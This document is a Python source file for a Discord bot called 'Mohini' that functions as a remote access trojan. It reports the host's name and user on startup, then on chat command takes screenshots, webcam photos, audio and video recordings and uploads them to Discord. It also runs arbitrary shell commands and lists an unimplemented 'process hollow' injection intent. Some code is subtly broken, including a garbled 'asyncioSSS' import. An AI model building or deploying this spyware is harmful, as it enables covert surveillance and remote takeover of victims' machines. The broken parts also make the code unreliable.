import discord
import json
import subprocess
import cv2
import mss
import sounddevice as sd
import numpy as np
import wave
import os
import shutil
import time, socket, getpass
import asyncioSSS
from datetime import datetime
from discord.ext import commands
from PIL import Image
from textblob import TextBlob
import google.generativeai as genai

# Load configuration from config.json
with open("Folder/config.json", "r") as config_file:
    config = json.load(config_file)

TOKEN = config["TOKEN"]
GEMINI_API_KEY = config["GEMINI_API_KEY"]

# Initialize Gemini API
genai.configure(api_key=GEMINI_API_KEY)

# Enable intents for message handling
intents = discord.Intents.default()
intents.message_content = True

# Create bot instance
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to store temporary files
TEMP_DIR = "Mohini_temp"
os.makedirs(TEMP_DIR, exist_ok=True)

# NLP Function for understanding commands
def get_intent(text):
    blob = TextBlob(text)
    keywords = {"screenshot": ["screenshot", "screen"],
                "camera": ["photo", "picture", "camera"],
                "record audio": ["audio", "record sound", "mic"],
                "record video": ["video", "record clip"],
                "run command": ["run", "execute", "command"],
                "ai response": ["ask", "question", "explain", "tell"],
                "process hollow": ["hollow", "inject", "replace process"]}
    
    for intent, words in keywords.items():
        if any(word in text for word in words):
            return intent
    
    return None

# Function to clean up temporary files
def cleanup_temp_files():
    if os.path.exists(TEMP_DIR):
        shutil.rmtree(TEMP_DIR)
        os.makedirs(TEMP_DIR, exist_ok=True)

# Periodic cleanup every 10 minutes
async def cleanup_task():
    while True:
        await asyncio.sleep(600)
        cleanup_temp_files()

@bot.event
async def on_ready():
    hostname = socket.gethostname()  # Get system hostname
    username = getpass.getuser()  # Get logged-in username
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current time
    online_message = f"🔥 **Mohini - ({hostname}) ({username}) is online at ({current_time}).** 🔥"
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                await channel.send(online_message)
                break
    print(online_message)  # Also print it to the console
    asyncio.create_task(cleanup_task())  # Start cleanup task

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    content = message.content.lower()
    intent = get_intent(content)
    if intent == "screenshot":
        await screenshot(message.channel)
        return
    if intent == "camera":
        await camera(message.channel)
        return
    
    if intent == "record audio":
        duration = 5  # Default duration
        words = content.split()
        for i, word in enumerate(words):
            if word.isdigit():
                duration = int(word)
                break
        await record(message.channel, duration)
        return
    
    if intent == "record video":
        duration = 5  # Default duration
        words = content.split()
        for i, word in enumerate(words):
            if word.isdigit():
                duration = int(word)
                break
        await video(message.channel, duration)
        return
    
    if intent == "run command":
        command = message.content.replace("run", "").replace("execute", "").strip()
        if command:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                if len(output) > 2000:
                    output = output[:1990] + "..."
                await message.channel.send(f"```{output}```")
            except Exception as e:
                await message.channel.send(f"❌ Error: {e}")
        return
    if intent == "ai response":
        response = genai.generate(content)
        await message.channel.send(response)
        return
    await bot.process_commands(message)

@bot.command()
async def screenshot(ctx_or_channel):
    try:
        filename = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
        with mss.mss() as sct:
            sct.shot(output=filename)
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

@bot.command()
async def camera(ctx_or_channel):
    try:
        filename = os.path.join(TEMP_DIR, f"camera_{int(time.time())}.png")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():  # Check if the camera is available
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(filename, frame)
            await ctx_or_channel.send(file=discord.File(filename))
            os.remove(filename)
        else:
            await ctx_or_channel.send("❌ Failed to capture an image.")
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

# Record Audio for a Given Duration
@bot.command()
async def record(ctx_or_channel, duration: int = 5):
    try:
        if len(sd.query_devices()) == 0:  # Check if a microphone is available
            await ctx_or_channel.send("❌ No **microphone** is present on this system.")
            return
        filename = os.path.join(TEMP_DIR, f"recorded_audio_{int(time.time())}.wav")
        samplerate = 44100  # High-quality audio
        channels = 2  # Stereo recording
        await ctx_or_channel.send(f"🎤 **Recording audio for {duration} seconds...**")
        audio_data = sd.rec(int(samplerate * duration), samplerate=samplerate, channels=channels, dtype=np.int16)
        sd.wait()
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(samplerate)
            wf.writeframes(audio_data.tobytes())
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

@bot.command()
async def video(ctx_or_channel, duration: int = 5):
    try:
        filename = os.path.join(TEMP_DIR, f"recorded_video_{int(time.time())}.avi")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():  # Check if the camera is available
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while int(time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

bot.run(TOKEN)
